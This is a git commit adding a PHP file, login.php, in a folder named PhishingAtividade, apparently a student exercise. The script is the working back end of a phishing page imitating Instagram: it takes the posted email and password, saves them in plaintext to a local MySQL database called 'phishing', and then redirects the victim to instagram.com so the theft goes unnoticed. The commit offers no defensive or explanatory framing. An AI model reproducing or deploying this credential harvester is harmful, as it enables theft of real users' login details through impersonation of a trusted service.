1a43f47ffab3da4e8fc4c2ee571e8cfd63a3154c
João Perez <130391820+JoaoPerez1809@users.noreply.github.com>
2025-05-07 13:51:50 -0300

    Add files via upload

---
+++ PhishingAtividade/login.php
@@ -0,0 +1,27 @@
+<?php
+
+
+var_dump($_SERVER["REQUEST_METHOD"]);
+print_r($_POST);
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    if ($_POST["email"] != "" AND $_POST["pass"] != "") {
+
+
+        $conn = new PDO("mysql:host=localhost;dbname=phishing", 'root', '');
+
+        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+        echo "Connected successfully";
+        $stmt =  $conn->prepare(' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
+        $stmt->execute(array ( $_POST["email"], $_POST["pass"]));
+        // echo "feito";	
+        header("Location:https://instagram.com");
+    }else{
+       header("Location:/");
+    }
+    
+}else{
+    die("");
+}
+
+?>
